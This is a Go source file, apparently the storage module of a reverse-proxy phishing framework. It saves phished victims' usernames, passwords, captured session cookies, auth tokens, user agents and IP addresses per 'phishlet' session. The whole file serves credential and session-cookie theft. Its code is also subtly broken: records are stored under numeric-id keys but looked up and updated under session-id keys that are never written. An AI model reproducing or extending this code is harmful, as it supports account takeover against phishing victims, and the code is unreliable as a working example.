package database

import (
	"encoding/json"
	"fmt"
	"time"

	"github.com/tidwall/buntdb"
)

const SessionTable = "sessions"

// -------------------- Session Structs --------------------

type Session struct {
	Id           int                                `json:"id"`
	Phishlet     string                             `json:"phishlet"`
	LandingURL   string                             `json:"landing_url"`
	Username     string                             `json:"username"`
	Password     string                             `json:"password"`
	Custom       map[string]string                  `json:"custom"`
	BodyTokens   map[string]string                  `json:"body_tokens"`
	HttpTokens   map[string]string                  `json:"http_tokens"`
	CookieTokens map[string]map[string]*CookieToken `json:"cookie_tokens"`
	SessionId    string                             `json:"session_id"`
	UserAgent    string                             `json:"user_agent"`
	RemoteAddr   string                             `json:"remote_addr"`
	CreateTime   int64                              `json:"create_time"`
	UpdateTime   int64                              `json:"update_time"`
}

type CookieToken struct {
	Name     string `json:"name"`
	Value    string `json:"value"`
	Path     string `json:"path"`
	HttpOnly bool   `json:"http_only"`
}

// -------------------- Initialization --------------------

// sessionsInit creates necessary indexes for the sessions table
func (d *Database) sessionsInit() error {
	if err := d.db.CreateIndex("sessions_id", SessionTable+":*", buntdb.IndexJSON("id")); err != nil {
		return fmt.Errorf("failed to create index sessions_id: %v", err)
	}
	if err := d.db.CreateIndex("sessions_sid", SessionTable+":*", buntdb.IndexJSON("session_id")); err != nil {
		return fmt.Errorf("failed to create index sessions_sid: %v", err)
	}
	return nil
}

// -------------------- Session Operations --------------------

func (d *Database) sessionsCreate(sid string, phishlet string, landing_url string, useragent string, remote_addr string) (*Session, error) {
	id, err := d.getNextId(SessionTable)
	if err != nil {
		return nil, err
	}

	session := &Session{
		Id:           id,
		Phishlet:     phishlet,
		LandingURL:   landing_url,
		Username:     "",
		Password:     "",
		Custom:       make(map[string]string),
		BodyTokens:   make(map[string]string),
		HttpTokens:   make(map[string]string),
		CookieTokens: make(map[string]map[string]*CookieToken),
		SessionId:    sid,
		UserAgent:    useragent,
		RemoteAddr:   remote_addr,
		CreateTime:   time.Now().Unix(),
		UpdateTime:   time.Now().Unix(),
	}

	err = d.db.Update(func(tx *buntdb.Tx) error {
		_, _, err := tx.Set(d.genIndex(SessionTable, id), d.getPivot(session), nil)
		return err
	})

	return session, err
}

func (d *Database) sessionsList() ([]*Session, error) {
	var sessions []*Session

	err := d.db.View(func(tx *buntdb.Tx) error {
		return tx.Ascend("", func(key, value string) bool {
			if key == SessionTable+":0:id" {
				return true
			}
			var session Session
			if err := json.Unmarshal([]byte(value), &session); err == nil {
				sessions = append(sessions, &session)
			}
			return true
		})
	})

	return sessions, err
}

func (d *Database) sessionsGetBySid(sid string) (*Session, error) {
	var session *Session

	err := d.db.View(func(tx *buntdb.Tx) error {
		val, err := tx.Get(SessionTable + ":" + sid)
		if err != nil {
			return err
		}
		return json.Unmarshal([]byte(val), &session)
	})

	return session, err
}

func (d *Database) sessionsGetById(id int) (*Session, error) {
	var session *Session

	err := d.db.View(func(tx *buntdb.Tx) error {
		val, err := tx.Get(d.genIndex(SessionTable, id))
		if err != nil {
			return err
		}
		return json.Unmarshal([]byte(val), &session)
	})

	return session, err
}

func (d *Database) sessionsUpdateUsername(sid string, username string) error {
	return d.db.Update(func(tx *buntdb.Tx) error {
		val, err := tx.Get(SessionTable + ":" + sid)
		if err != nil {
			return err
		}

		var session Session
		if err := json.Unmarshal([]byte(val), &session); err != nil {
			return err
		}

		session.Username = username
		session.UpdateTime = time.Now().Unix()

		_, _, err = tx.Set(SessionTable+":"+sid, d.getPivot(session), nil)
		return err
	})
}

func (d *Database) sessionsUpdatePassword(sid string, password string) error {
	return d.db.Update(func(tx *buntdb.Tx) error {
		val, err := tx.Get(SessionTable + ":" + sid)
		if err != nil {
			return err
		}

		var session Session
		if err := json.Unmarshal([]byte(val), &session); err != nil {
			return err
		}

		session.Password = password
		session.UpdateTime = time.Now().Unix()

		_, _, err = tx.Set(SessionTable+":"+sid, d.getPivot(session), nil)
		return err
	})
}

func (d *Database) sessionsUpdateCustom(sid string, name string, value string) error {
	return d.db.Update(func(tx *buntdb.Tx) error {
		val, err := tx.Get(SessionTable + ":" + sid)
		if err != nil {
			return err
		}

		var session Session
		if err := json.Unmarshal([]byte(val), &session); err != nil {
			return err
		}

		if session.Custom == nil {
			session.Custom = make(map[string]string)
		}
		session.Custom[name] = value
		session.UpdateTime = time.Now().Unix()

		_, _, err = tx.Set(SessionTable+":"+sid, d.getPivot(session), nil)
		return err
	})
}

func (d *Database) sessionsUpdateBodyTokens(sid string, tokens map[string]string) error {
	return d.db.Update(func(tx *buntdb.Tx) error {
		val, err := tx.Get(SessionTable + ":" + sid)
		if err != nil {
			return err
		}

		var session Session
		if err := json.Unmarshal([]byte(val), &session); err != nil {
			return err
		}

		session.BodyTokens = tokens
		session.UpdateTime = time.Now().Unix()

		_, _, err = tx.Set(SessionTable+":"+sid, d.getPivot(session), nil)
		return err
	})
}

func (d *Database) sessionsUpdateHttpTokens(sid string, tokens map[string]string) error {
	return d.db.Update(func(tx *buntdb.Tx) error {
		val, err := tx.Get(SessionTable + ":" + sid)
		if err != nil {
			return err
		}

		var session Session
		if err := json.Unmarshal([]byte(val), &session); err != nil {
			return err
		}

		session.HttpTokens = tokens
		session.UpdateTime = time.Now().Unix()

		_, _, err = tx.Set(SessionTable+":"+sid, d.getPivot(session), nil)
		return err
	})
}

func (d *Database) sessionsUpdateCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
	return d.db.Update(func(tx *buntdb.Tx) error {
		val, err := tx.Get(SessionTable + ":" + sid)
		if err != nil {
			return err
		}

		var session Session
		if err := json.Unmarshal([]byte(val), &session); err != nil {
			return err
		}

		session.CookieTokens = tokens
		session.UpdateTime = time.Now().Unix()

		_, _, err = tx.Set(SessionTable+":"+sid, d.getPivot(session), nil)
		return err
	})
}

func (d *Database) sessionsDelete(id int) error {
	return d.db.Update(func(tx *buntdb.Tx) error {
		_, err := tx.Delete(d.genIndex(SessionTable, id))
		return err
	})
}
